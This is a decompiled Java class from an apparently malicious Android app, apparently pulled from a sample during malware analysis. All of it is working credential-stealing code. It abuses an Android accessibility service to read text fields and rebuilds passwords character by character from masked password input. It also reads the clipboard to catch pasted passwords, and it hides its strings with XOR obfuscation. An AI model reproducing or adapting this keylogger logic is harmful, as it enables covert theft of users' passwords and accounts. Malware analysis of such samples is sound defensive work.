package com.zjxyxnvvp.nxvxchltf.j;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipboardManager;
import android.view.accessibility.AccessibilityNodeInfo;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class c {
    private static short[] $ = {8040, 8039, 8034, 8059, 8041, 8036, 8042, 8057, 8047, 6932, 6917, 6936, 6932, 6991, 6928, 6924, 6913, 6921, 6926, 5091, 5080, 5080, 5015, 5077, 5086, 5072, 5015, 5059, 5074, 5071, 5059};

    /* renamed from: a  reason: collision with root package name */
    private StringBuilder f346a = new StringBuilder();

    /* renamed from: b  reason: collision with root package name */
    private String f347b;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public c(String str) {
    }

    private String b(AccessibilityService accessibilityService) {
        CharSequence text;
        ClipboardManager clipboardManager = (ClipboardManager) accessibilityService.getSystemService($(0, 9, 7947));
        if (clipboardManager.hasPrimaryClip() && clipboardManager.getPrimaryClipDescription().hasMimeType($(9, 19, 7008)) && (text = clipboardManager.getPrimaryClip().getItemAt(0).getText()) != null) {
            return text.toString();
        }
        return null;
    }

    private boolean d(String str) {
        return str.length() > 1 && str.charAt(0) != 8226;
    }

    public void a(AccessibilityService accessibilityService, AccessibilityNodeInfo accessibilityNodeInfo) {
        StringBuilder sb;
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null) {
            if (accessibilityNodeInfo.isPassword()) {
                if (d(text.toString())) {
                    sb = new StringBuilder();
                } else {
                    if (this.f347b != null) {
                        int length = text.length() - this.f347b.length();
                        if (length > 1) {
                            String b2 = b(accessibilityService);
                            if (b2 != null) {
                                this.f346a.append(b2);
                            }
                        } else if (length != 1 && (text.length() != 1 || text.charAt(0) == 8226)) {
                            if (length < 0) {
                                StringBuilder sb2 = this.f346a;
                                sb = new StringBuilder(sb2.substring(0, Math.max(sb2.length() + length, 0)));
                            }
                        }
                        this.f347b = text.toString();
                    }
                    this.f346a.append(text.charAt(text.length() - 1));
                    this.f347b = text.toString();
                }
                this.f346a = sb;
                this.f347b = text.toString();
            } else {
                this.f346a = new StringBuilder(text);
            }
            if (this.f346a.length() >= 64) {
                this.f346a = new StringBuilder($(19, 31, 5047));
            }
        }
    }

    public String c() {
        return this.f346a.toString();
    }
}
